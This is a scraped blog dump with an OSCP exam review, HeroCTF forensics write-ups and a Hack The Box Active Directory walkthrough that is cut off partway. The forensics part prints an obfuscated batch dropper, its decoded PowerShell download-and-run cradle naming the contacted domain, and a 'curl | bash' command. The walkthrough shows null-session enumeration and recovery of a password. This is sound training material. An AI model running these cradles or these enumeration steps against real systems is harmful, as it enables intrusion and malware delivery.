environnement un minimum √† jour.\nRetour sur les labs : # L‚ÄôOSCP propose 6 ‚Äúpractice labs‚Äù qui simulent de petites entreprises avec des technologies vari√©es. Pour ma part, j‚Äôai r√©alis√© 5 labs sur 6. J‚Äôai commenc√© par le lab Medtech, qui est le lab le plus simple de l‚ÄôOSCP. Ce lab introduit bien √† la mentalit√© d‚ÄôOffsec et permet de comprendre leur logique de cr√©ation de labs. Ensuite, j‚Äôai fait Relia ; ce lab est, selon moi, comparable √† Dante, mais il est un peu plus difficile sur la partie AD. Je recommande vraiment de faire ces labs car ils vous formatent √† penser comme Offsec. La difficult√© n‚Äôest pas vraiment extr√™me, loin de l√†, mais parfois il y a des choses tordues. Par exemple, j‚Äôai bloqu√© beaucoup trop de temps sur un step web o√π il y avait une vuln√©rabilit√© de type path traversal. Je cherchais √† r√©cup√©rer une cl√© priv√©e SSH, mais Offsec avait utilis√© un format non traditionnel pour nommer le fichier. Ces subtilit√©s permettent cependant de d√©velopper une mentalit√© de tryharder, tr√®s utile pour l‚Äôexamen.\nPour finir avec les labs, Offsec met √† disposition 3 labs qui simulent des environnements d‚Äôexamen, en gros des examens blancs. Je les ai tous r√©alis√©s en conditions d‚Äôexamen blanc, avec un chrono de 24 heures et un rapport √† la fin. Les labs augmentent en difficult√© : A \u0026lt; B \u0026lt; C, mais selon moi, le lab qui m‚Äôa le plus mis en difficult√© est le lab B. Ces examens blancs ont √©t√© pour moi un moyen de me tester et aussi de me rassurer pour le jour J.\nStrat√©gie pour le jour J : # Avec ces trois mois de cours et de labs pour comprendre ce qu‚ÄôOffsec attend, j‚Äôai donc mont√© ma petite strat√©gie (pas tr√®s originale). Mon but √©tait assez commun √† tous ceux qui passent l‚ÄôOSCP : taper l‚ÄôAD ‚áí taper une standalone ‚áí fun.\nJe redoutais cependant certains aspects que j‚Äôai peu rencontr√©s pendant les labs d‚Äôexamen blanc. Je savais que le foothold sur la partie Set AD allait me prendre du temps, je me suis conditionn√© √† tout donner √† ce moment-l√†. Je savais qu‚Äôune fois que j‚Äôaurais un pied dans l‚ÄôAD, j‚Äôavais les comp√©tences pour finir le Set sans trop de difficult√©, mais je redoutais vraiment le foothold. Un autre point que je redoutais √©tait le mouvement lat√©ral de MS01 vers MS02. Dans tous les labs que j‚Äôai faits, Offsec fonctionne souvent de la m√™me mani√®re : MS01 ‚áí MS02 ‚áí DA. Cependant, le passage de MS01 √† MS02 est parfois tordu, pas forc√©ment difficile techniquement, mais si vous √©num√©rez un peu mal, voire m√™me si vous ne retournez pas la machine de fond en comble, il est probable que vous ne trouviez pas l‚Äôinfo cruciale.\nPour la partie Standalone, je n‚Äôavais pas d‚Äôinqui√©tude particuli√®re. Je savais que je n‚Äôallais pas r√©ussir √† avoir 110 sur 100, mais je savais que j‚Äôallais r√©ussir √† root au moins une standalone sur trois, car, encore une fois, j‚Äôai toujours r√©ussi √† rooter au minimum une machine pendant les labs d‚Äôexamen blanc. D‚Äôailleurs, j‚Äôai trouv√© les machines Windows souvent plus simples que les machines Linux voil√†, je pose √ßa ici.\nThe Time as come : # √áa y est, nous y est ! J‚Äôai programm√© mon examen pour 14h30 un samedi, ce qui me permet de tryhard tout l‚Äôapr√®s-midi + toute la soir√©e + de dormir un peu + de tryhard le matin.\nJe ne parlerai pas trop du proctoring (la surveillance) pendant l‚Äôexamen, mais globalement, ils voient tout ce que tu fais. Ils coupent le VPN s‚Äôil y a un probl√®me, mais pas le chrono, donc une fois que c‚Äôest parti, pas de ralentis. Je ne sais pas pourquoi, mais ils √©taient assez longs √† r√©pondre dans mon cas, m√™me si je sais que ce n‚Äôest pas toujours comme √ßa.\nLe set AD : # Bon, commen√ßons par le set AD. MAN‚Ä¶ c‚Äô√©tait quoi, √ßa ? J‚Äôai eu si peur de rater mon exam ! Je m‚Äôexplique. Comme pr√©vu, je me concentre au maximum pour trouver l‚Äôinitial access. Je le trouve assez rapidement, et en plus, il √©tait vraiment cool, donc l√†, d√©j√†, gros soulagement. J‚Äô√©l√®ve mes privil√®ges et je fais ma post-exploitation. Et l√† vient le moment aussi redout√© que la peste : le pivot vers MS02, et c‚Äôest le drame. Je trouve des infos dans ma post-exploitation, mais rien qui permet de pivoter vers MS02. Le stress commence √† monter car je reste bloqu√© au moins 3 heures sur ce step. Je prends une pause pour aller manger et r√©fl√©chir. Pendant ma r√©flexion, je me rends compte qu‚Äôavec toutes les infos que j‚Äôai, pur√©e, √ßa devrait marcher\u0026hellip; ou alors, il me manque un truc. Je reprends l‚Äôexam et demande au surveillant de r√©initialiser les machines car quelque chose ne va pas. Le surveillant appelle un admin, et il reset le set AD. Et l√†, mon cousin, l‚Äôinfo que je cherchais appara√Æt comme par magie ! Pur√©e, j‚Äôavais bloqu√© 5 heures parce que le lab √©tait cass√© (√©videmment, dans cette situation, pas moyen de gratter du temps).\nJe continue donc mon petit bout de chemin, et bam, encore devant un mur‚Ä¶ Je ne trouve rien, mais vraiment rien sur MS02 qui pourrait me permettre de passer Domain Admin. Et l√†, quand je vous dis qu‚Äôil fallait retourner la box, c‚Äôest r√©el ! L‚Äôinfo que je cherchais √©tait dans un endroit vraiment TRICKY. Je ne sais pas pourquoi j‚Äôai pens√© √† chercher √† cet endroit, mais je remercie le seigneur pour cet √©clair de g√©nie. Bref, apr√®s √ßa, je d√©roule. D‚Äôailleurs, le reste du set √©tait vraiment sympa, et je termine donc DA √† 23h.\nStandalone : # Mon sc√©nario de r√™ve serait d‚Äôaller dormir avec les 60 points en poche. Du coup, je tente une standalone. J‚Äôavais deux machines Windows et une Linux √† disposition. Comme je l‚Äôai dit, j‚Äôavais l‚Äôimpression que les machines Windows √©taient plus simples, donc je tente une machine Windows et l√†, je d√©roule comme le Bar√ßa : en une heure, j‚Äô√©tais root de la machine. J\u0026rsquo;√©tais ravi, mais vraiment ravi. OSCP dans la poche, let\u0026rsquo;s go ! Je vais donc rejoindre ma dulcin√©e au lit, et je dors comme un chef (8 heures de sommeil pendant un exam OSCP, t‚Äôas d√©j√† vu √ßa ?).\nJe me r√©veille et je reprends l‚Äôexam sans pression. Je pense que le fait d‚Äôavoir valid√© les points m‚Äôa fait perdre mon tryhard, et je n‚Äôai pas r√©ussi √† faire d‚Äôautres points sur les autres standalone. Il est donc 12h, il me reste 2h15 d‚Äôexam, et je commence le rapport.\nLe rapport : # Pour le rapport, j‚Äôai utilis√© Sysreptor, h√©berg√© sur mon VPS, ainsi que des notes sur Notion tout au long de l‚Äôexamen. Vraiment, Sysreptor est une super solution pour les rapports. J‚Äôai fini mon rapport le soir, mais j‚Äôai relu et encore relu jusqu‚Äô√† la fin du temps.\nLes r√©sultats : # J‚Äôai attendu une semaine pour avoir la r√©ponse d‚ÄôOffsec. C‚Äô√©tait dur de penser √† autre chose‚Ä¶ enfin bref, j‚Äôai eu les r√©sultats pendant la nuit, √† 3h du matin. La notif de mail me r√©veille, et l√†, c‚Äôest l‚Äôexplosion d‚Äô√©motion. J‚Äô√©tais un homme combl√©. Je me rendors, soulag√© et heureux.\nFin de la review, merci d‚Äôavoir lu jusque-l√†. Bon courage pour l‚Äôexamen, et n\u0026rsquo;oubliez pas : si √ßa ne marche pas, demandez un reset du lab par un admin X).\n","date":"12 November 2024","externalUrl":null,"permalink":"/posts/oscp/","section":"Posts","summary":"","title":"Review : OSCP by Offsec","type":"posts"},{"content":"","date":"29 October 2024","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":" Team score : # Intro : # HeroCTF is a French CTF that was held on the weekend of Friday, October 25 and it ended on October 27. For my part I focused on the challenges of the forensics category and I have finished all the challenges. The challenges were cool but not necessarily very complicated, it‚Äôs also for that I could finish the category, in short in any case the challs were of good quality and it is what counts, so thank you to chall maker. ü§©\nHEROCTF Twitter\nTenant Trouble - easy : # Challenge statement : üìùIt seems that a user account has been compromised, could you identify the account in question and the start of the attack?\nFor this challenge we have a csv file with logs. It seems to be logs of connection to the Azure AD service. When we quickly analyse the csv it comes to bump that a user often returns, this user is mister.bennet .\nUsing a linux command I will count the number of failed connection for this user.\ncat winchester77_signin_logs_2024.csv | grep \u0026#34;mister.bennet@winchester77.onmicrosoft.com\u0026#34; | grep \u0026#34;UserLoginFailed\u0026#34;| wc 364 1092 74359 it would seem that we have to do an attack by brute force or password spraying targeted on this user because the other users does not have as much failed connection (while other users like lydia.bennet and elizabeth.bennet were also targeted with notable failures (24 and 20 attempts, respectively).)\nNow that we have found the targeted user let‚Äôs try to find out when the attack started.\n\u0026gt; cat winchester77_signin_logs_2024.csv | grep \u0026#34;mister.bennet@winchester77.onmicrosoft.com\u0026#34; | grep -C2 \u0026#34;UserLoginFailed\u0026#34; I find that the user mister.bennet had a fairly normal connection in terms of until timestamp 2024-05-02T11:05:37Z because after this, the failed logins begins to be frequent signifying that I have a beginning attack on this user account.\nFor the flag I take the timestanp of the first failed connection from the moment when the connections fail become frequent.\nHero{2024-05-02;mister.bennet@winchester77.onmicrosoft.com} Transformer #1 -easy : # Challenge statement : üìùA suspicious file has been found on one of your employee\u0026rsquo;s workstations. He apparently retrieved the .iso file from an e-mail attachment\u0026hellip; Find the file contained in the iso, identify the file type and calculate its sha256 fingerprint.\nFor this challenge we retrieve an archive in which is contained a file .iso, which would have served to compromise a workstation. the files are often used by attackers to indirectly deliver the payload , the challenge asks us to recover the bad file contained in the iso.\nFor this, it is enough to mount the image iso in local.\n\u0026gt; mkdir -p /mnt/hero \u0026gt; mount -o loop monthly-report-S3-2024.iso /mnt/hero mount: /mnt/disk: WARNING: source write-protected, mounted read-only. \u0026gt; ls /mnt/hero Document.lnk \u0026gt; file /mnt/hero/Document.lnk /mnt/hero/Document.lnk: MS Windows shortcut, Item id list present, Has Relative path, Icon number=0, Unicoded, HasExpIcon \u0026#34;%SystemRoot%\\explorer.exe\u0026#34;, length=0, window=showminnoactive, IDListSize 0x00db, Root folder \u0026#34;20D04FE0-3AEA-1069-A2D8-08002B30309D\u0026#34;, Volume \u0026#34;C:\\\u0026#34; # Calculate SHA256 footprint \u0026gt; sha256sum /mnt/hero/Document.lnk c3bb38b34c7dfbb1e9e9d588d77f32505184c79cd3628a70ee6df6061e128f3e /mnt/hero/Document.lnk Flag :\nHERO{lnk;c3bb38b34c7dfbb1e9e9d588d77f32505184c79cd3628a70ee6df6061e128f3e} Transformer #2 - Medium : # Challenge statement : üìùCan you identify to wich malware dropper the iso file is related to ? Also, it looks like the dropper is contacting a remote ressource, can you find the domain name the dropper is trying to reach ? [TLP:GREEN/PAP:AMBER]\nIn the continuity of the previous challenge we are asked to go deeper into compromise analysis. So we have to find out what domain the payload will connect to.\nSo I start by analyzing the lnk file, a file .lnk is a Windows shortcut pointing to a specific file or program. In a malicious context, it can discreetly launch embedded or external scripts (BAT, PowerShell), facilitating the execution of unauthorized code from attachments (such as ISOs) without arousing the user‚Äôs suspicion.\n\u0026gt; exiftool Document.lnk ExifTool Version Number : 12.76 File Name : Document.lnk Directory : . File Size : 1242 bytes File Modification Date/Time : 2024:10:26 10:32:16-04:00 File Access Date/Time : 2024:10:26 10:32:21-04:00 File Inode Change Date/Time : 2024:10:26 10:32:16-04:00 File Permissions : -r--r--r-- File Type : LNK File Type Extension : lnk MIME Type : application/octet-stream Flags : IDList, RelativePath, IconFile, Unicode, ExpIcon File Attributes : (none) Target File Size : 0 Icon Index : (none) Run Window : Show Minimized No Activate Hot Key : (none) Target File DOS Name : engaged.bat Relative Path : ..\\..\\..\\..\\dew\\engaged.bat Icon File Name : c:\\windows\\explorer.exe Thanks to exiftool I find that the shortcut points to a bat file, this file is on our iso file let‚Äôs analyze it.\nWhen you look at its content you realize that it is obfuscated.\n\u0026gt; file dew/engaged.bat engaged.bat: DOS batch file, ASCII text, with very long lines (788), with CRLF, LF line terminators \u0026gt; strings monthly-report-S3-2024.iso @echo off :drzclsxvupw set nqudlc=q :jgvinpsutyw set fiezbj=a :rxqbgdzfitm set msonvq=y :nrsowealbgt set dhltmr=u :kmrdcueqphz set sgcuek=m :oxwnaylmrbe set vzbtmg=z :zkcdvpsuyla set fysdib=o :xfhmgkeciqd set wvopta=j :nzywfxjsarm set skuweh=s :udpthcvznyf set dayvow=r :ksxpbguolhi set qtlekd=w :ezkafqrjmsg set ynwiok=f :tlubafkrcjq set fblvmd=b :miydogxwuze set nryihu=p :shbclnfxmug set msotjd=v :vrkdhtwycse set beicuz=d :mlriuxhvktd set vmefxs=e :gwflzjxyrke set yplurb=c :iaqcolgbmjx set koxzju=n :uwfesitardk set ncbdqi=t :yoclxjvthns set wkcnoz=i :bmuzlkxjgdo set qawudo=l :cihavwbtjxs set tbilrv=h :dkyqpfrguew set wgtpdy=k :jdoxmbsckre set uhafms=x :itjnoalbxfs set ojuvcf=g :hmdvrkgajxo :X%yplurb%M%fblvmd%RDHB%nryihu%Z%beicuz%%nryihu%UW%qtlekd%WVA%msonvq%%wvopta%%tbilrv%I %nryihu%%fysdib%%qtlekd%%vmefxs%%dayvow%%skuweh%%tbilrv%%vmefxs%%qawudo%%qawudo% -%qtlekd% %tbilrv%%wkcnoz%%beicuz%%beicuz%%vmefxs%%koxzju% -%koxzju%%fysdib%%nryihu% -%vmefxs%%nryihu% %fblvmd%%msonvq%%nryihu%%fiezbj%%skuweh%%skuweh% -%vmefxs%%koxzju%%yplurb% SQBFAF%ojuvcf%AIAA%fysdib%AE4AZQB3AC0AT%qtlekd%B%wkcnoz%AG%fysdib%AZQB%wvopta%AHQAIABOAGUA%beicuz%AA%dhltmr%AF%yplurb%AZQB%wkcnoz%AGMA%fblvmd%AB%nryihu%AGUA%fblvmd%%ojuvcf%B0AC%wgtpdy%AL%ojuvcf%B%wgtpdy%AG8A%beicuz%%qtlekd%B%dhltmr%AG%qtlekd%A%fblvmd%%qtlekd%B%tbilrv%AGQA%yplurb%%qtlekd%B0AHIA%fiezbj%QB%dhltmr%AG%yplurb%AKAA%wkcnoz%AG%ojuvcf%A%beicuz%AB0AHAAO%ojuvcf%A%msotjd%AC8A%fblvmd%QB%qawudo%AGUA%yplurb%%ojuvcf%B%msotjd%AG4A%fiezbj%QB4AHQAL%ojuvcf%B%wvopta%AG8A%fblvmd%QA%msotjd%AG%yplurb%AYQB0AGUAI%ojuvcf%A%nryihu%AA== :EC%nryihu%%vzbtmg%%dhltmr%B%fysdib%V I will uplaod the file beats on virustotal for a first analysis. Virustotal really gives us all the information we need, especially the domain contact but also the deobfusced powershell payload.\nAfter having decoded the base64 we optient therefore a powershell starts. IEX is a powershell function to download and run payloads in memory without leaving traces on the disk, so in this command we have the domain contact by the malware dropper.\n\u0026gt; echo \u0026#34;SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBlAGUAcgBvAG4AaQB4AHQALgBjAG8AbQAvAGcAYQB0AGUAIgApAA\u0026#34;|base64 -d IEX (New-Object Net.Webclient).downloadstring(\u0026#34;http://meeronixt.com/gate\u0026#34;) Ok we have the domain that is contacted by the dropper but now we need to find the family to whom it belongs. I search on the internet for droppers with an opperation mode like the following, phising ‚áí ISO ‚áí lnk ‚áí bat And I find an article that tells me about the malware dropper Bumblebee.\nBumblebee Being Distributed in Korea Through Email Hijacking - ASEC\nthe opperation mode seems to match Phishing ‚ûî ISO File ‚ûî LNK (shortcut) ‚ûî BAT ‚ûî PowerShell ‚ûî Connexion C2 ‚ûî Download Payload (ransomware, persistance, etc...) So i try the following flag and that work :\nHERO{Bumblebee;meeronixt.com} LazySysAdmin #2 : # Challenge statement : üìùYou have identified the malicious load, it seems, that a script was executed before the computer turns off, you made a copy of the disk and you start investigating to understand the \u0026ldquo;extent of the damage\u0026rdquo;\nThis challenge is related to the chall LazySysAdmin #1 in the MISC category. In this first chall, the end is to discover that a user has made and executed the following command on his post.\ncurl -s https://ghostbin.site/6y65l/raw | bash \u0026amp;\u0026amp; sleep 2 \u0026amp;\u0026amp; reboot -f We are given a copy of the disk to investigate and find where is install the attacker. To start the investigation we can mount the image.\n\u0026gt; mkdir HERO \u0026gt; mount -o loop server-SX03.iso HERO \u0026gt; cd HERO We will look for signs of compromise, including persistence. When we talk about Linux persistance I think first to the Linux service, to go look if there is something not normal you have to look in /etc/systemd/system and check the .service file is not regular or modified .\nBut I can‚Äôt find anything that tells me the PC was compromised.\nMalicious scripts often use crontabs to establish persistence. I will investigate the crontab. For this I use a cheat-sheet found on hacktricks.\nLinux Forensics | HackTricks\nIn the var /spool/cron/crontabs/ folder I find a cron file named server.\n\u0026gt; cat var/spool/cron/crontabs/server # DO NOT EDIT THIS FILE - edit the master and reinstall. # (/tmp/crontab.8fT3dU/crontab installed on Sun Oct 27 10:11:11 2024) # (Cron version -- : crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $) # Edit this file to introduce tasks to be run by cron. # # Each task to run has to be defined through a single line # indicating with different fields when the task will be run # and what command to run for the task # # To define the time you can provide concrete values for # minute (m), hour (h), day of month (dom), month (mon), # and day of week (dow) or use \u0026#39;*\u0026#39; in these fields (for \u0026#39;any\u0026#39;). # # Notice that tasks will be started based on the cron\u0026#39;s system # daemon\u0026#39;s notion of time and timezones. # # Output of the crontab jobs (including errors) is sent through # email to the user the crontab file belongs to (unless redirected). # # For example, you can run a backup of all your user accounts # at 5 a.m every week with: # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ # # For more information see the manual pages of crontab(5) and cron(8) # # m h dom mon dow command * * * * * /tmp/.wrapper_script.sh\u0026#34; The cron runs continuously and runs a bash script located in /tmp let‚Äôs take a look at /tmp.\nContent of .wrapper_script.sh.\n\u0026gt; cat .wrapper_script.sh #!/bin/bash while true; do # Your main script code here /tmp/.script.sh # Wait for 15 seconds before running again sleep 15 done Content of .script.sh\n\u0026gt; cat .script.sh #!/bin/bash RANDOM_NUMBER=$(shuf -i 1-13 -n 1) INSUTLS=$(curl -s https://pastebin.com/raw/59mL2V9i) temp=$(echo \u0026#34;$INSUTLS\u0026#34; | sed -n \u0026#34;${RANDOM_NUMBER}p\u0026#34; ) tempp= echo \u0026#34;$temp\u0026#34; | base64 -id wall $tempp .wrapper_script.sh runs the .script.sh script in a loop every 15 seconds. .script.sh retrieves content from Pastebin, chooses a random line, decodes it to base64, and then displays the decoded text as a message on the user‚Äôs desktop (with wall).\nIf we do a curl on the url found, we get data logically encoded in b64. To take the flag you can decode these data.\n\u0026gt; curl -s https://pastebin.com/raw/59mL2V9i | while read line; do echo \u0026#34;$line\u0026#34; | base64 -d; done You suck ! Fucking idiot You suck ! Seriously, Who the fuck is Vozek? You suck ! You suck ! You suck ! XXX_D4rk_rogue is the best ! HERO{AlwaYs-Ch3ck_What_u-C0Py-P4ste} You suck ! Did you really believe it was possible to download RAM, you dumbass xD You suck ! You suck ! the flag is HERO{AlwaYs-Ch3ck_What_u-C0Py-P4ste}\n","date":"29 October 2024","externalUrl":null,"permalink":"/posts/heroctf/","section":"Posts","summary":"","title":"HeroCTFv6 Forensics WU","type":"posts"},{"content":"","date":"8 July 2024","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory","type":"tags"},{"content":" Scanning : # Run my inital scan to see open ports and services.\n\u0026gt; nmap -sV -sC -Pn -sS -T4 10.10.10.182 # OUTPUT 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-06 15:27:58Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-08-06T15:28:47 |_ start_date: 2024-08-06T15:26:19 |_clock-skew: 1m00s | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.26 seconds Run full ports scan.\n\u0026gt; nmap -p- --max-retries 1 -n -Pn -T5 10.10.10.182 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49170/tcp open unknown lets add domaine and the FQDN to my /etc/hosts file.\n\u0026gt; echo \u0026#34;10.10.10.182 cascade.local CASC-DC1.cascade.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerate SMB with Null session : # I can connect with null session on smb service.\n\u0026gt; nxc smb 10.10.10.182 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\: lets enumerate the user with nxc using users flag.\n\u0026gt; nxc smb 10.10.10.182 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --users SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\: SMB 10.10.10.182 445 CASC-DC1 -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.10.182 445 CASC-DC1 CascGuest \u0026lt;never\u0026gt; 0 Built-in account for guest access to the computer/domain SMB 10.10.10.182 445 CASC-DC1 arksvc 2020-01-09 16:18:20 0 SMB 10.10.10.182 445 CASC-DC1 s.smith 2020-01-28 19:58:05 0 SMB 10.10.10.182 445 CASC-DC1 r.thompson 2020-01-09 19:31:26 0 SMB 10.10.10.182 445 CASC-DC1 util 2020-01-13 02:07:11 0 SMB 10.10.10.182 445 CASC-DC1 j.wakefield 2020-01-09 20:34:44 0 SMB 10.10.10.182 445 CASC-DC1 s.hickson 2020-01-13 01:24:27 0 SMB 10.10.10.182 445 CASC-DC1 j.goodhand 2020-01-13 01:40:26 0 SMB 10.10.10.182 445 CASC-DC1 a.turnbull 2020-01-13 01:43:13 0 SMB 10.10.10.182 445 CASC-DC1 e.crowe 2020-01-13 03:45:02 0 SMB 10.10.10.182 445 CASC-DC1 b.hanson 2020-01-13 16:35:39 0 SMB 10.10.10.182 445 CASC-DC1 d.burman 2020-01-13 16:36:12 0 SMB 10.10.10.182 445 CASC-DC1 BackupSvc 2020-01-13 16:37:03 0 SMB 10.10.10.182 445 CASC-DC1 j.allen 2020-01-13 17:23:59 0 SMB 10.10.10.182 445 CASC-DC1 i.croft 2020-01-15 21:46:21 0 # GET ONLY THE USERS \u0026gt; awk \u0026#39;{print $5}\u0026#39; user.txt arksvc s.smith r.thompson util j.wakefield s.hickson j.goodhand a.turnbull e.crowe b.hanson d.burman BackupSvc j.allen i.croft LDAP Null bind : # Using nxc i can see i connect on LDAP using null bind.\n\u0026gt; nxc ldap 10.10.10.182 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; lets try to enumerate all the user find thanks to ldap query. to do so I made a little bash script that execute the nxc command to use my list.\n#!/bin/bash USER_LIST=\u0026#34;users.lst\u0026#34; while IFS= read -r user; do nxc ldap 10.10.10.182 -u \u0026#34;\u0026#34; -p \u0026#34;\u0026#34; --query \u0026#34;(sAMAccountName=$user)\u0026#34; \u0026#34;\u0026#34; done \u0026lt; \u0026#34;$USER_LIST\u0026#34; # RUN THE SCRIPT \u0026gt; chmod +x script.sh \u0026amp;\u0026amp; ./script.sh in one of the output I find an LDAP attribute unusual enough to use r.thompson\nLDAP 10.10.10.182 389 CASC-DC1 [+] Response for object: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 objectClass: top person organizationalPerson user LDAP 10.10.10.182 389 CASC-DC1 cn: Ryan Thompson LDAP 10.10.10.182 389 CASC-DC1 sn: Thompson LDAP 10.10.10.182 389 CASC-DC1 givenName: Ryan LDAP 10.10.10.182 389 CASC-DC1 distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 instanceType: 4 LDAP 10.10.10.182 389 CASC-DC1 whenCreated: 20200109193126.0Z LDAP 10.10.10.182 389 CASC-DC1 whenChanged: 20200323112031.0Z LDAP 10.10.10.182 389 CASC-DC1 displayName: Ryan Thompson LDAP 10.10.10.182 389 CASC-DC1 uSNCreated: 24610 LDAP 10.10.10.182 389 CASC-DC1 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 uSNChanged: 295010 LDAP 10.10.10.182 389 CASC-DC1 name: Ryan Thompson LDAP 10.10.10.182 389 CASC-DC1 objectGUID: 0x2dfa43eaa9e0524ba9132f5b1570418c LDAP 10.10.10.182 389 CASC-DC1 userAccountControl: 66048 LDAP 10.10.10.182 389 CASC-DC1 badPwdCount: 14 LDAP 10.10.10.182 389 CASC-DC1 codePage: 0 LDAP 10.10.10.182 389 CASC-DC1 countryCode: 0 LDAP 10.10.10.182 389 CASC-DC1 badPasswordTime: 133674344266797596 LDAP 10.10.10.182 389 CASC-DC1 lastLogoff: 0 LDAP 10.10.10.182 389 CASC-DC1 lastLogon: 132247339125713230 LDAP 10.10.10.182 389 CASC-DC1 pwdLastSet: 132230718862636251 LDAP 10.10.10.182 389 CASC-DC1 primaryGroupID: 513 LDAP 10.10.10.182 389 CASC-DC1 objectSid: 0x01050000000000051500000032fba1c60b1df147f5c8724555040000 LDAP 10.10.10.182 389 CASC-DC1 accountExpires: 9223372036854775807 LDAP 10.10.10.182 389 CASC-DC1 logonCount: 2 LDAP 10.10.10.182 389 CASC-DC1 sAMAccountName: r.thompson LDAP 10.10.10.182 389 CASC-DC1 sAMAccountType: 805306368 LDAP 10.10.10.182 389 CASC-DC1 userPrincipalName: r.thompson@cascade.local LDAP 10.10.10.182 389 CASC-DC1 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local LDAP 10.10.10.182 389 CASC-DC1 dSCorePropagationData: 20200126183918.0Z 20200119174753.0Z 20200119174719.0Z 20200119174508.0Z 16010101000000.0Z LDAP 10.10.10.182 389 CASC-DC1 lastLogonTimestamp: 132294360317419816 LDAP 10.10.10.182 389 CASC-DC1 msDS-SupportedEncryptionTypes: 0 LDAP 10.10.10.182 389 CASC-DC1 cascadeLegacyPwd: clk0bjVldmE= this attribute contains a data encoded in b64 we can decode it to find the initial given\n\u0026gt; echo \u0026#34;clk0bjVldmE=\u0026#34; | base64 -d rY4n5eva Thanks to that we have our first access to the domain.\nnxc smb 10.10.10.182 -u \u0026#39;r.thompson\u0026#39; -p rY4n5eva SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\r.thompson:rY4n5eva Back To SMB : # lets enumerate the smb share\n\u0026gt; smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182 -d cascade.local [+] IP: 10.10.10.182:445 Name: cascade.local Status: Authenticated Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Audit$ NO ACCESS C$ NO ACCESS Default share Data READ ONLY IPC$ NO ACCESS Remote IPC NETLOGON READ ONLY Logon server share print$ READ ONLY Printer Drivers SYSVOL READ ONLY Logon server share When we have a lot of sharing to list we can use a module of nxc called spider_plus that will find all the files to which we accessed dand all the shares accessible from the smb service\n\u0026gt; nxc smb 10.10.10.182 -u \u0026#39;r.thompson\u0026#39; -p rY4n5eva -M spider_plus SMB 10.10.10.182 445 CASC-DC1 [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\r.thompson:rY4n5eva SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] Started module spidering_plus with the following options: SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] DOWNLOAD_FLAG: False SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] STATS_FLAG: True SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] EXCLUDE_FILTER: [\u0026#39;print$\u0026#39;, \u0026#39;ipc$\u0026#39;] SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] EXCLUDE_EXTS: [\u0026#39;ico\u0026#39;, \u0026#39;lnk\u0026#39;] SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] MAX_FILE_SIZE: 50 KB SPIDER_PLUS 10.10.10.182 445 CASC-DC1 [*] OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus SMB 10.10.10.182 445 CASC-DC1 [*] 